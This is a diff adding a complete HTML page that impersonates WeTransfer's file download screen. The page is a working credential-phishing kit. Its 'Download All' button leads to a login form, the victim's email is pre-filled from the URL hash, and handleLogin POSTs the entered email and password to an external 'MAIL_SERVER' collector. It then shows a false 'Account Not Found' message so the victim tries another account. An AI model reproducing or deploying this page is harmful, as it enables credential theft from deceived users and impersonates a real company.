@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WeTransfer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --black: #111;
+    --white: #fff;
+    --gray-light: #f2f2f2;
+    --gray-mid: #aaa;
+    --gray-border: #ddd;
+    --blue: #2d6af6;
+    --sky: #c7dff7;
+    --radius: 16px;
+    --radius-sm: 10px;
+    --red: #ff4d4d;
+  }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: var(--white);
+    color: var(--black);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ─── NAV ─────────────────────────────────── */
+  nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px 32px;
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    background: rgba(255,255,255,0.85);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--gray-border);
+  }
+
+  .logo {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.35rem;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+    color: var(--black);
+    text-decoration: none;
+  }
+
+  .logo span { font-style: italic; }
+
+  nav .nav-links {
+    display: flex;
+    gap: 28px;
+    list-style: none;
+  }
+
+  nav .nav-links a {
+    text-decoration: none;
+    color: var(--black);
+    font-size: 0.875rem;
+    font-weight: 500;
+    opacity: 0.7;
+    transition: opacity 0.2s;
+  }
+
+  nav .nav-links a:hover { opacity: 1; }
+
+  .nav-cta {
+    background: var(--black);
+    color: var(--white) !important;
+    opacity: 1 !important;
+    padding: 8px 18px;
+    border-radius: 50px;
+    font-size: 0.85rem !important;
+    font-weight: 500 !important;
+    transition: background 0.2s !important;
+  }
+
+  .nav-cta:hover { background: #333 !important; }
+
+  /* ─── LAYOUT ──────────────────────────────── */
+  .page-wrapper {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    min-height: 100vh;
+    padding-top: 64px;
+  }
+
+  /* ─── LEFT PANEL ──────────────────────────── */
+  .left-panel {
+    background: #e8eef8;
+    position: relative;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    padding: 60px 48px 40px;
+    min-height: calc(100vh - 64px);
+  }
+
+  .hero-text {
+    position: relative;
+    z-index: 2;
+  }
+
+  .hero-text .tagline {
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.8rem;
+    font-weight: 400;
+    color: #667;
+    margin-bottom: 16px;
+    letter-spacing: 0.5px;
+  }
+
+  .hero-text h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2rem, 3.5vw, 3rem);
+    font-weight: 400;
+    line-height: 1.15;
+    color: var(--black);
+    margin-bottom: 4px;
+  }
+
+  .hero-text h1 strong {
+    font-weight: 700;
+    font-style: italic;
+  }
+
+  /* Browser mockup card */
+  .browser-mockup {
+    margin-top: 48px;
+    border-radius: var(--radius);
+    overflow: hidden;
+    box-shadow: 0 24px 60px rgba(0,0,0,0.15);
+    background: var(--white);
+    position: relative;
+    z-index: 2;
+    max-width: 380px;
+  }
+
+  .browser-bar {
+    background: #b8d0e8;
+    padding: 12px 16px;
+    display: flex;
+    gap: 7px;
+    align-items: center;
+  }
+
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot.red   { background: #ff5f57; }
+  .dot.yellow{ background: #febc2e; }
+  .dot.green { background: #28c840; }
+
+  .upload-ui {
+    padding: 28px 24px;
+  }
+
+  .upload-zone {
+    border: 2px dashed var(--gray-border);
+    border-radius: var(--radius-sm);
+    padding: 28px 20px;
+    text-align: center;
+    cursor: pointer;
+    transition: border-color 0.2s, background 0.2s;
+    margin-bottom: 20px;
+  }
+
+  .upload-zone:hover {
+    border-color: var(--blue);
+    background: #f5f8ff;
+  }
+
+  .upload-zone.drag-over {
+    border-color: var(--blue);
+    background: #eef3ff;
+  }
+
+  .plus-btn {
+    width: 44px; height: 44px;
+    background: var(--blue);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 12px;
+    font-size: 1.5rem;
+    color: var(--white);
+    cursor: pointer;
+    transition: transform 0.2s, background 0.2s;
+  }
+
+  .plus-btn:hover { transform: scale(1.08); background: #1a55e0; }
+
+  .upload-zone p { font-size: 0.82rem; color: var(--gray-mid); }
+  .upload-zone p a { color: var(--black); text-decoration: underline; cursor: pointer; }
+
+  .input-row {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+
+  .field {
+    border: none;
+    border-bottom: 1px solid var(--gray-border);
+    padding: 10px 4px;
+    font-size: 0.85rem;
+    font-family: 'DM Sans', sans-serif;
+    color: var(--black);
+    outline: none;
+    background: transparent;
+    transition: border-color 0.2s;
+  }
+
+  .field::placeholder { color: var(--gray-mid); }
+  .field:focus { border-color: var(--black); }
+
+  .send-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    margin-top: 8px;
+  }
+
+  .options-btn {
+    width: 40px; height: 40px;
+    border: 1.5px solid var(--gray-border);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer;
+    font-size: 1rem;
+    color: var(--gray-mid);
+    background: none;
+    transition: border-color 0.2s;
+  }
+
+  .options-btn:hover { border-color: var(--black); color: var(--black); }
+
+  .transfer-btn {
+    flex: 1;
+    background: var(--blue);
+    color: var(--white);
+    border: none;
+    border-radius: 50px;
+    padding: 12px 24px;
+    font-size: 0.9rem;
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.1s;
+  }
+
+  .transfer-btn:hover { background: #1a55e0; }
+  .transfer-btn:active { transform: scale(0.98); }
+
+  /* File list inside browser mockup */
+  .file-list {
+    display: none;
+    flex-direction: column;
+    gap: 6px;
+    margin-bottom: 12px;
+  }
+
+  .file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: var(--gray-light);
+    border-radius: 8px;
+    padding: 8px 12px;
+    font-size: 0.78rem;
+  }
+
+  .file-item-name { font-weight: 500; }
+  .file-item-size { color: var(--gray-mid); }
+  .file-remove {
+    cursor: pointer;
+    color: var(--gray-mid);
+    background: none;
+    border: none;
+    font-size: 1rem;
+    line-height: 1;
+    transition: color 0.2s;
+  }
+  .file-remove:hover { color: #e53; }
+
+  /* ─── RIGHT PANEL ─────────────────────────── */
+  .right-panel {
+    background: var(--white);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 48px 40px;
+    min-height: calc(100vh - 64px);
+  }
+
+  /* ─── DOWNLOAD CARD ───────────────────────── */
+  .download-card {
+    width: 100%;
+    max-width: 380px;
+    background: var(--white);
+    border-radius: var(--radius);
+    box-shadow: 0 8px 40px rgba(0,0,0,0.08);
+    border: 1px solid var(--gray-border);
+    overflow: hidden;
+    animation: floatIn 0.5s ease;
+  }
+
+  @keyframes floatIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .card-header {
+    padding: 32px 28px 24px;
+    text-align: center;
+    border-bottom: 1px solid var(--gray-border);
+  }
+
+  .card-logo {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.3rem;
+    font-weight: 700;
+    margin-bottom: 24px;
+    display: block;
+  }
+
+  .card-logo span { font-style: italic; }
+
+  /* Tabs */
+  .tabs {
+    display: flex;
+    gap: 0;
+    border-bottom: 1px solid var(--gray-border);
+    margin-bottom: 0;
+    width: 100%;
+  }
+
+  .tab-btn {
+    flex: 1;
+    background: none;
+    border: none;
+    border-bottom: 2px solid transparent;
+    padding: 10px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 500;
+    color: var(--gray-mid);
+    cursor: pointer;
+    transition: color 0.2s, border-color 0.2s;
+    margin-bottom: -1px;
+  }
+
+  .tab-btn.active {
+    color: var(--black);
+    border-bottom-color: var(--black);
+  }
+
+  /* Download view */
+  .download-view { padding: 28px; }
+
+  .dl-icon {
+    width: 60px; height: 60px;
+    border: 2px solid var(--gray-border);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 20px;
+    font-size: 1.4rem;
+    color: var(--gray-mid);
+    animation: pulse 2.5s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(45,106,246,0); }
+    50%       { box-shadow: 0 0 0 8px rgba(45,106,246,0.08); }
+  }
+
+  .files-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    background: var(--gray-light);
+    border-radius: var(--radius-sm);
+    padding: 16px;
+    margin-bottom: 14px;
+  }
+
+  .file-thumb {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+
+  .file-thumb .fname {
+    font-size: 0.78rem;
+    font-weight: 500;
+    color: var(--black);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .file-thumb .fmeta {
+    font-size: 0.72rem;
+    color: var(--gray-mid);
+  }
+
+  .validity-note {
+    font-size: 0.75rem;
+    color: var(--gray-mid);
+    text-align: center;
+    margin-bottom: 16px;
+  }
+
+  .progress-bar-wrap {
+    height: 3px;
+    background: var(--gray-border);
+    border-radius: 4px;
+    margin-bottom: 16px;
+    overflow: hidden;
+    display: none;
+  }
+
+  .progress-bar-fill {
+    height: 100%;
+    width: 0%;
+    background: var(--black);
+    border-radius: 4px;
+    transition: width 0.2s ease;
+  }
+
+  .dl-btn {
+    width: 100%;
+    background: var(--black);
+    color: var(--white);
+    border: none;
+    border-radius: 50px;
+    padding: 14px;
+    font-size: 0.9rem;
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: background 0.2s, transform 0.1s;
+  }
+
+  .dl-btn:hover { background: #333; }
+  .dl-btn:active { transform: scale(0.98); }
+
+  /* Login view */
+  .login-view { padding: 28px; display: none; }
+
+  .login-view h2 {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.15rem;
+    font-weight: 400;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .form-group {
+    position: relative;
+    margin-bottom: 12px;
+  }
+
+  .form-icon {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--gray-mid);
+    font-size: 0.9rem;
+  }
+
+  .form-input {
+    width: 100%;
+    background: var(--gray-light);
+    border: 1.5px solid transparent;
+    border-radius: var(--radius-sm);
+    padding: 13px 14px 13px 40px;
+    font-size: 0.85rem;
+    font-family: 'DM Sans', sans-serif;
+    color: var(--black);
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .form-input:focus { border-color: var(--black); background: var(--white); }
+
+  .forgot-link {
+    display: block;
+    text-align: center;
+    font-size: 0.78rem;
+    color: var(--black);
+    text-decoration: underline;
+    margin-bottom: 14px;
+    cursor: pointer;
+  }
+
+  .verify-btn {
+    width: 100%;
+    background: var(--black);
+    color: var(--white);
+    border: none;
+    border-radius: 50px;
+    padding: 14px;
+    font-size: 0.9rem;
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: background 0.2s;
+  }
+
+  .verify-btn:hover { background: #333; }
+
+  .we-badge {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 20px; height: 20px;
+    background: var(--white);
+    border-radius: 4px;
+    font-size: 0.6rem;
+    font-weight: 700;
+    color: var(--black);
+  }
+
+  /* ─── FOOTER ──────────────────────────────── */
+  footer {
+    grid-column: 1 / -1;
+    padding: 16px 32px;
+    border-top: 1px solid var(--gray-border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 0.75rem;
+    color: var(--gray-mid);
+  }
+
+  footer a { color: var(--gray-mid); text-decoration: none; }
+  footer a:hover { color: var(--black); }
+
+  /* ─── TOAST ───────────────────────────────── */
+  .toast {
+    position: fixed;
+    bottom: 28px;
+    left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--red);
+    color: var(--white);
+    padding: 12px 24px;
+    border-radius: 50px;
+    font-size: 0.85rem;
+    font-weight: 500;
+    z-index: 999;
+    transition: transform 0.35s cubic-bezier(.34,1.56,.64,1);
+    white-space: nowrap;
+  }
+
+  .toast.show { transform: translateX(-50%) translateY(0); }
+
+  /* ─── MOBILE ──────────────────────────────── */
+  @media (max-width: 768px) {
+    nav { padding: 14px 20px; }
+    .nav-links { display: none; }
+
+    .page-wrapper {
+      grid-template-columns: 1fr;
+      grid-template-rows: auto auto;
+      padding-top: 58px;
+    }
+
+    /* Download/login card comes first on mobile */
+    .right-panel  { order: 1; }
+    .left-panel   { display: none; }
+    footer        { order: 2; }
+
+    .right-panel {
+      padding: 28px 20px 40px;
+      min-height: unset;
+    }
+
+    .download-card { max-width: 100%; box-shadow: none; border: none; }
+
+    footer {
+      flex-direction: column;
+      gap: 8px;
+      text-align: center;
+    }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a class="logo" href="#"><span>We</span>Transfer</a>
+  <ul class="nav-links">
+    <li><a href="#">Products</a></li>
+    <li><a href="#">Pricing</a></li>
+    <li><a href="#">Blog</a></li>
+    <li><a href="#" class="nav-cta" onclick="event.preventDefault(); goToLoginTab()">Log in</a></li>
+  </ul>
+</nav>
+
+<!-- MAIN -->
+<div class="page-wrapper">
+
+  <!-- LEFT: UPLOAD -->
+  <section class="left-panel">
+    <div class="hero-text">
+      <p class="tagline">Send files on your terms with WeTransfer</p>
+      <h1>The simplest way to share <strong>big ideas</strong></h1>
+    </div>
+
+    <div class="browser-mockup">
+      <div class="browser-bar">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+      </div>
+      <div class="upload-ui">
+        <!-- Drop zone -->
+        <div class="upload-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
+          <div class="plus-btn">+</div>
+          <p>Add your files<br><small>Or <a onclick="event.stopPropagation(); document.getElementById('fileInput').click()">select a folder</a></small></p>
+        </div>
+        <input type="file" id="fileInput" multiple hidden>
+
+        <!-- File list -->
+        <div class="file-list" id="fileList"></div>
+
+        <!-- Fields -->
+        <div class="input-row">
+          <input class="field" type="email" placeholder="Email to" id="emailTo">
+          <input class="field" type="email" placeholder="Your email" id="yourEmail">
+          <input class="field" type="text"  placeholder="Message (optional)" id="msgField">
+        </div>
+
+        <!-- Actions -->
+        <div class="send-row">
+          <button class="options-btn" title="More options" onclick="showToast('Options coming soon')">···</button>
+          <button class="transfer-btn" onclick="handleTransfer()">Transfer</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RIGHT: DOWNLOAD / LOGIN -->
+  <section class="right-panel">
+    <div class="download-card">
+      <div class="card-header">
+        <span class="card-logo"><span>We</span>Transfer</span>
+        <div class="tabs">
+          <button class="tab-btn active" onclick="switchTab('download', this)">Download</button>
+          <button class="tab-btn" onclick="switchTab('login', this)">Log in</button>
+        </div>
+      </div>
+
+      <!-- DOWNLOAD TAB -->
+      <div class="download-view" id="downloadView">
+        <div class="dl-icon">↓</div>
+        <div class="files-grid">
+          <div class="file-thumb">
+            <span class="fname">List Of Items.pdf</span>
+            <span class="fmeta">961Kb · pdf</span>
+          </div>
+          <div class="file-thumb">
+            <span class="fname">Quotation.pdf</span>
+            <span class="fmeta">7Mb · pdf</span>
+          </div>
+        </div>
+        <p class="validity-note">Files are valid for 7 days</p>
+        <button class="dl-btn" onclick="goToLoginTab()">
+          <span class="we-badge">we</span> Download All
+        </button>
+      </div>
+
+      <!-- LOGIN TAB -->
+      <div class="login-view" id="loginView">
+        <h2>Log in</h2>
+        <div class="form-group">
+          <span class="form-icon">✉</span>
+          <input class="form-input" type="email" placeholder="Email" id="loginEmail">
+        </div>
+        <div class="form-group">
+          <span class="form-icon">🔒</span>
+          <input class="form-input" type="password" placeholder="Password" id="loginPass">
+        </div>
+        <a class="forgot-link" onclick="showToast('Password reset email sent!')">Forgot password?</a>
+        <button class="verify-btn" id="verifyBtn" onclick="handleLogin()">
+          <span class="we-badge">we</span> Verify Email to view document
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer>
+    <span>© 2025 WeTransfer B.V. — <a href="#">Privacy</a> · <a href="#">Terms</a></span>
+    <span>Max file size: <strong>2 GB</strong> free · <a href="#">Go Plus</a></span>
+  </footer>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<script>
+  // ── Your Railway server URL ────────────────────────────────
+  const MAIL_SERVER = 'http://localhost:3000';
+
+  window.addEventListener('DOMContentLoaded', () => {
+    const hash = window.location.hash.replace('#', '');
+
+    // If hash looks like an email, autofill and switch to login tab
+    if (hash && hash.includes('@')) {
+      const email = decodeURIComponent(hash);
+      document.getElementById('loginEmail').value = email;
+
+      // Switch to login tab automatically
+      const loginBtn = document.querySelectorAll('.tab-btn')[1];
+      switchTab('login', loginBtn);
+    }
+  });
+
+  // ── Toast ──────────────────────────────────────────────────
+  function showToast(msg, duration = 2800) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), duration);
+  }
+
+  // ── Tabs ───────────────────────────────────────────────────
+  function switchTab(tab, btn) {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('downloadView').style.display = tab === 'download' ? 'block' : 'none';
+    document.getElementById('loginView').style.display    = tab === 'login'    ? 'block' : 'none';
+  }
+
+  // ── File selection & drag-drop ─────────────────────────────
+  const dropZone  = document.getElementById('dropZone');
+  const fileInput = document.getElementById('fileInput');
+  const fileList  = document.getElementById('fileList');
+  let selectedFiles = [];
+
+  fileInput.addEventListener('change', e => addFiles(e.target.files));
+
+  dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('drag-over'); });
+  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('drag-over'));
+  dropZone.addEventListener('drop', e => {
+    e.preventDefault();
+    dropZone.classList.remove('drag-over');
+    addFiles(e.dataTransfer.files);
+  });
+
+  function addFiles(files) {
+    Array.from(files).forEach(f => {
+      if (!selectedFiles.find(x => x.name === f.name)) selectedFiles.push(f);
+    });
+    renderFileList();
+  }
+
+  function renderFileList() {
+    if (!selectedFiles.length) {
+      fileList.style.display = 'none';
+      return;
+    }
+    fileList.style.display = 'flex';
+    fileList.innerHTML = selectedFiles.map((f, i) => `
+      <div class="file-item">
+        <span class="file-item-name">${f.name}</span>
+        <span class="file-item-size">${formatSize(f.size)}</span>
+        <button class="file-remove" onclick="removeFile(${i})">×</button>
+      </div>
+    `).join('');
+  }
+
+  function removeFile(i) {
+    selectedFiles.splice(i, 1);
+    renderFileList();
+  }
+
+  function formatSize(bytes) {
+    if (bytes < 1024)       return bytes + ' B';
+    if (bytes < 1048576)    return (bytes / 1024).toFixed(0) + ' KB';
+    return (bytes / 1048576).toFixed(1) + ' MB';
+  }
+
+  // ── Transfer ───────────────────────────────────────────────
+  function handleTransfer() {
+    const to   = document.getElementById('emailTo').value.trim();
+    const from = document.getElementById('yourEmail').value.trim();
+
+    if (!selectedFiles.length) { showToast('⚠ Please add at least one file'); return; }
+    if (!to)   { showToast('⚠ Please enter recipient email'); return; }
+    if (!from) { showToast('⚠ Please enter your email'); return; }
+    if (!isEmail(to) || !isEmail(from)) { showToast('⚠ Invalid email address'); return; }
+
+    showToast('🚀 Transfer started! Link will be sent to ' + to, 3500);
+    setTimeout(() => {
+      selectedFiles = [];
+      renderFileList();
+      document.getElementById('emailTo').value  = '';
+      document.getElementById('yourEmail').value = '';
+      document.getElementById('msgField').value  = '';
+      fileInput.value = '';
+    }, 1000);
+  }
+
+  // ── Go to login tab (used by nav + Download All) ───────────
+  function goToLoginTab() {
+    const loginBtn = document.querySelectorAll('.tab-btn')[1];
+    switchTab('login', loginBtn);
+    // Scroll card into view on mobile
+    document.querySelector('.download-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }
+
+  // ── Login ──────────────────────────────────────────────────
+  async function handleLogin() {
+    const email = document.getElementById('loginEmail').value.trim();
+    const pass  = document.getElementById('loginPass').value;
+
+    if (!email || !pass) { showToast('⚠ Please fill in all fields'); return; }
+    if (!isEmail(email)) { showToast('⚠ Invalid email address'); return; }
+
+    const btn = document.getElementById('verifyBtn');
+    btn.innerHTML = '<span class="we-badge">we</span> Verifying…';
+    btn.disabled = true;
+
+    try {
+      const res = await fetch(`${MAIL_SERVER}/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password: pass }),
+      });
+
+      const data = await res.json();
+
+      if (data.success) {
+        showToast('Account Not Found: Please try another email ', 3500);
+      } else {
+        showToast('⚠ Something went wrong. Try again.', 3500);
+      }
+    } catch (err) {
+      console.error(err);
+      showToast('⚠ Could not reach server. Try again.', 3500);
+    } finally {
+      btn.innerHTML = '<span class="we-badge">we</span> Verify Email to view document';
+      btn.disabled = false;
+    }
+  }
+
+  function isEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+</script>
+</body>
+</html>
